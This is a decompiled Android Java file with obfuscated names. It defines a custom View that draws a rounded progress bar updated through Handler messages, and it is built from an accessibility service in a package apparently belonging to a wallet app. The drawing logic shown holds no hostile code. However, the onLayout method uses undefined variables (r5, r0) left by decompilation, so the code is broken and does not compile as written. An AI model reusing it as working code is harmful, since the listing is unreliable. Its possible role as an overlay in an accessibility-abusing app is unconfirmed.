package e0;

import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.RectF;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.view.View;
import com.guard.wallet.service.MyAccessibilityService;

/* renamed from: e0.f */
/* loaded from: classes.dex */
public final class C0268f extends View implements Handler.Callback {

    /* renamed from: a */
    public final Handler f443a;

    /* renamed from: b */
    public Paint f444b;

    /* renamed from: c */
    public Paint f445c;

    /* renamed from: d */
    public RectF f446d;

    /* renamed from: e */
    public RectF f447e;

    /* renamed from: f */
    public int f448f;

    /* renamed from: g */
    public int f449g;

    /* renamed from: h */
    public int f450h;

    public C0268f(MyAccessibilityService myAccessibilityService) {
        super(myAccessibilityService);
        this.f448f = 0;
        this.f449g = 380;
        this.f450h = 14;
        Paint paint = new Paint();
        this.f444b = paint;
        paint.setColor(-1);
        this.f444b.setAntiAlias(true);
        this.f444b.setStyle(Paint.Style.FILL);
        this.f444b.setStrokeWidth(0.0f);
        Paint paint2 = new Paint();
        this.f445c = paint2;
        paint2.setColor(Color.parseColor("#1677ff"));
        this.f445c.setAntiAlias(true);
        this.f445c.setStyle(Paint.Style.FILL);
        this.f445c.setStrokeWidth(0.0f);
        this.f443a = new Handler(Looper.getMainLooper(), this);
    }

    @Override // android.os.Handler.Callback
    public final boolean handleMessage(Message message) {
        int i2 = message.what;
        if (i2 <= 0 || i2 <= this.f448f || i2 > 100) {
            return false;
        }
        this.f448f = i2;
        invalidate();
        return false;
    }

    @Override // android.view.View
    public final void onDraw(Canvas canvas) {
        if (this.f446d == null) {
            RectF rectF = new RectF();
            this.f446d = rectF;
            rectF.set(0.0f, 0.0f, this.f449g, this.f450h);
        }
        if (this.f447e == null) {
            this.f447e = new RectF();
        }
        RectF rectF2 = this.f446d;
        float f2 = rectF2.left;
        this.f447e.set(f2, rectF2.top, ((rectF2.right - f2) * (this.f448f / 100.0f)) + f2, rectF2.bottom);
        canvas.drawRoundRect(this.f446d, 100.0f, 100.0f, this.f444b);
        canvas.drawRoundRect(this.f447e, 100.0f, 100.0f, this.f445c);
    }

    @Override // android.view.View
    public final void onLayout(boolean z2, int i2, int i3, int i4, int i5) {
        float f2;
        super.onLayout(z2, i2, i3, i4, i5);
        if (this.f446d == null) {
            RectF rectF = new RectF();
            this.f446d = rectF;
            int i6 = i5 - i3;
            int i7 = (int) ((i4 - i2) * 0.4f);
            this.f449g = i7;
            float f3 = (r5 - i7) / 2.0f;
            if (i6 >= this.f450h) {
                f2 = (i6 - r0) / 2.0f;
            } else {
                this.f450h = i6;
                f2 = 0.0f;
            }
            rectF.set(f3, f2, i7 + f3, this.f450h + f2);
        }
    }

    @Override // android.view.View
    public final void onMeasure(int i2, int i3) {
        super.onMeasure(i2, i3);
    }
}
